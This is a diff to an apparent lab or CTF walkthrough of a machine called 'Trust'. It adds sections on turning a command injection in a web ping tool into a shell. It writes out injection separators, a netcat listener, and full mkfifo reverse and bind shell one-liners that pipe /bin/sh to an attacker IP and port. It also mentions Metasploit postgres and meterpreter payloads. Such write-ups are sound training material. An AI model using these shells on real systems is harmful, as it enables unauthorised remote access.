@@ -19,6 +19,8 @@ Welcome to the Trust write up.
       - [Manual way](#manual-way)
   - [Exploitation Phase](#exploitation-phase)
     - [HTTP 666](#http-666-1)
+      - [Getting any shell](#getting-any-shell)
+      - [Reverse shell or Bind shell](#reverse-shell-or-bind-shell)
     - [Postgres 5432](#postgres-5432-1)
       - [Copy from program cmd exec](#copy-from-program-cmd-exec)
       - [Create Lang](#create-lang)
@@ -401,7 +403,7 @@ set RPORT 5432
 exploit
 ```
 
-> Note: You can use the `setg` command insde of `set`. `setg` will set value
+> Note: You can use the `setg` command instead of `set`. `setg` will set value
 > you give it and set as a global setting.
 
 After running this the postgres module, we found that the postgres is using the
@@ -468,7 +470,73 @@ Now we can move on to the exploit phase of the attack.
 
 Now that we know that the ping tool on the site can be a command injection
 point. now we we can see. what can we do. when we run `whoami` we get www-data
-user. We can even look
+user. We should note that on linux systems www-data normally is not a admin user
+or sudo user. After a while putting `;`, `||`, `|`, `&&`, `&` to do our command
+injection. We should get a reverse shell. 
+
+#### Getting any shell
+
+When we try any basic shell the shell will just get closed by the server. 
+So we need a shell that won't get closed by the server. We can use the `mkfifo`
+shell, The *ONE* down side of it is that it will keep the web server busy with
+that `mkfifo` shell. Basically it will DOS the server for anyone else trying to
+connect to the server. And if you mess up the `IP` or `PORT` you will lock your
+self out of the machine.
+
+#### Reverse shell or Bind shell
+
+There are two methods for getting a connection that we can interact with. 
+
+**Reverse Shell**: Communication initiated by the compromised system to the
+attacker's system.
+
+To do a reverse shell we need to open our listeners first before putting our 
+reverse shell in. 
+
+```bash
+nc -lnvp <PORT>
+```
+
+- `-l`: This switch tells nc to operate in listening mode, which means it will
+  listen for incoming connections rather than initiating connections.
+
+- `-n`: This switch tells nc not to perform DNS resolution on any incoming
+  addresses. This can speed up the operation, especially when dealing with IP addresses instead of domain names.
+
+- `-v`: This switch enables verbose mode, which provides more detailed output,
+  including information about incoming connections and data transfer.
+
+- `-p` port: This switch specifies the port number on which nc should listen
+  for incoming connections.
+
+This is the shell that we will be using.
+ 
+```bash
+; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
+```
+
+If we did everything right we should have a shell on the computer and we can
+move to the [Privilege Escalation phase](#privilege-escalation)
+
+
+**Bind Shell**: Communication initiated by the attacker's system to the
+compromised system.
+
+This is the shell that we will be using 
+> Note: Unlike the reverse shell we don't need to open a listeners first
+ 
+```bash
+; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l <IP> <PORT> > /tmp/f
+```
+
+Don't forget that we need to make the connection, we can do that with the
+`netcat` command
+
+```bash
+nc <IP> <PORT>
+```
+If we did everything right we should have a shell on the computer and we can
+move to the [Privilege Escalation phase](#privilege-escalation)
 
 ### Postgres 5432
 
@@ -557,7 +625,8 @@ Now we can use our exploit. With the exploit command.
 ![running exploit](../../Assets/PwnToOwn/msfcmdexecexploit.png)
 
 Now we have our shell and we are login as the `postgres` user. After looking
-around we seem like we can't do much.
+around we seem like we can't do much. Now we can move on the
+[Privilege Escalation phase](#privilege-escalation)
 
 #### Create Lang
 
@@ -584,8 +653,10 @@ This will make the sessions a lot better for us.
 set payload payload/cmd/unix/python/meterpreter/bind_tcp
 ```
 
-Now that we have out payload we need to configure the settings.
+Now that we have our payload we need to configure the settings.
 
+
+Now we can move on the [Privilege Escalation phase](#privilege-escalation)
 ## Privilege Escalation
 
 Now that we are the on the system as www-data or postgres, You notice that
